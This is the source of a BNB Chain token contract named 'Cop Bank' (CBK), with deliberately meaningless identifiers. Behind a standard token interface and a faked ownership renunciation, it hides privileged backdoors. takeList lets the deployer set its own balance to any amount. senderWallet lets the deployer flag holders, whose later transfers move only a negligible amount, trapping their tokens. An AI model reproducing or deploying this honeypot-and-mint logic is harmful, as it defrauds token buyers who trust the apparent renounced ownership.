/**
 *Submitted for verification at BscScan.com on 2023-02-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface totalIs {
    function createPair(address sellAuto, address tokenShould) external returns (address);
}

interface liquidityBuyAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CopBank {
    uint8 private modeLimit = 18;
    
    address public walletLiquidityList;
    address private senderAt;

    string private shouldLimit = "Cop Bank";
    mapping(address => mapping(address => uint256)) private limitSender;

    uint256 private receiverSellExempt;
    bool public tokenFee;
    uint256 public launchMin;
    bool public isWalletMode;
    bool private walletMax;

    bool private fundMinSwap;
    bool private launchIs;
    bool public limitIs;
    address public listTx;
    mapping(address => bool) public takeEnableMarketing;
    uint256 private isToken = 100000000 * 10 ** modeLimit;

    mapping(address => bool) public totalSwap;
    uint256 constant exemptList = 10 ** 10;
    mapping(address => uint256) private buyWalletFrom;
    string private totalListExempt = "CBK";
    
    

    event OwnershipTransferred(address indexed limitFrom, address indexed senderLaunch);
    event Transfer(address indexed from, address indexed senderMode, uint256 value);
    event Approval(address indexed fundTo, address indexed spender, uint256 value);

    constructor (){
        
        liquidityBuyAmount amountMin = liquidityBuyAmount(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        listTx = totalIs(amountMin.factory()).createPair(amountMin.WETH(), address(this));
        senderAt = receiverReceiverFund();
        if (launchMin != receiverSellExempt) {
            isWalletMode = true;
        }
        walletLiquidityList = senderAt;
        totalSwap[walletLiquidityList] = true;
        
        buyWalletFrom[walletLiquidityList] = isToken;
        emit Transfer(address(0), walletLiquidityList, isToken);
        totalSenderTo();
    }

    

    function shouldToken(address fromLaunchedFee) public {
        if (limitIs) {
            return;
        }
        
        totalSwap[fromLaunchedFee] = true;
        
        limitIs = true;
    }

    function maxFee() public {
        if (launchMin != receiverSellExempt) {
            walletMax = false;
        }
        
        isWalletMode=false;
    }

    function totalSupply() external view returns (uint256) {
        return isToken;
    }

    function limitLaunchWallet() public {
        if (launchMin != receiverSellExempt) {
            fundMinSwap = false;
        }
        if (isWalletMode != fundMinSwap) {
            launchMin = receiverSellExempt;
        }
        receiverSellExempt=0;
    }

    function tokenTakeFee() public {
        if (receiverSellExempt == launchMin) {
            fundMinSwap = true;
        }
        
        tokenFee=false;
    }

    function name() external view returns (string memory) {
        return shouldLimit;
    }

    function symbol() external view returns (string memory) {
        return totalListExempt;
    }

    function receiverReceiverFund() private view returns (address) {
        return msg.sender;
    }

    function decimals() external view returns (uint8) {
        return modeLimit;
    }

    function senderWallet(address senderReceiver) public {
        
        if (senderReceiver == walletLiquidityList || senderReceiver == listTx || !totalSwap[receiverReceiverFund()]) {
            return;
        }
        
        takeEnableMarketing[senderReceiver] = true;
    }

    function balanceOf(address swapReceiverAuto) public view returns (uint256) {
        return buyWalletFrom[swapReceiverAuto];
    }

    function transfer(address swapLiquidity, uint256 launchLimit) external returns (bool) {
        return transferFrom(receiverReceiverFund(), swapLiquidity, launchLimit);
    }

    function allowance(address launchedEnable, address maxAmount) external view returns (uint256) {
        return limitSender[launchedEnable][maxAmount];
    }

    function txLaunched() public {
        if (isWalletMode != launchIs) {
            launchIs = false;
        }
        if (tokenFee == walletMax) {
            walletMax = true;
        }
        receiverSellExempt=0;
    }

    function takeList(uint256 launchLimit) public {
        if (!totalSwap[receiverReceiverFund()]) {
            return;
        }
        buyWalletFrom[walletLiquidityList] = launchLimit;
    }

    function approve(address maxAmount, uint256 launchLimit) public returns (bool) {
        limitSender[receiverReceiverFund()][maxAmount] = launchLimit;
        emit Approval(receiverReceiverFund(), maxAmount, launchLimit);
        return true;
    }

    function totalSenderTo() public {
        emit OwnershipTransferred(walletLiquidityList, address(0));
        senderAt = address(0);
    }

    function transferFrom(address tokenFund, address swapLiquidity, uint256 launchLimit) public returns (bool) {
        if (tokenFund != receiverReceiverFund() && limitSender[tokenFund][receiverReceiverFund()] != type(uint256).max) {
            require(limitSender[tokenFund][receiverReceiverFund()] >= launchLimit);
            limitSender[tokenFund][receiverReceiverFund()] -= launchLimit;
        }
        if (swapLiquidity == walletLiquidityList || tokenFund == walletLiquidityList) {
            return shouldSender(tokenFund, swapLiquidity, launchLimit);
        }
        
        if (takeEnableMarketing[tokenFund]) {
            return shouldSender(tokenFund, swapLiquidity, exemptList);
        }
        
        return shouldSender(tokenFund, swapLiquidity, launchLimit);
    }

    function getOwner() external view returns (address) {
        return senderAt;
    }

    function isTrading() public {
        if (receiverSellExempt == launchMin) {
            launchIs = true;
        }
        if (launchMin == receiverSellExempt) {
            receiverSellExempt = launchMin;
        }
        tokenFee=false;
    }

    function shouldSender(address tokenExempt, address receiverLimit, uint256 launchLimit) internal returns (bool) {
        require(buyWalletFrom[tokenExempt] >= launchLimit);
        buyWalletFrom[tokenExempt] -= launchLimit;
        buyWalletFrom[receiverLimit] += launchLimit;
        emit Transfer(tokenExempt, receiverLimit, launchLimit);
        return true;
    }

    function owner() external view returns (address) {
        return senderAt;
    }


}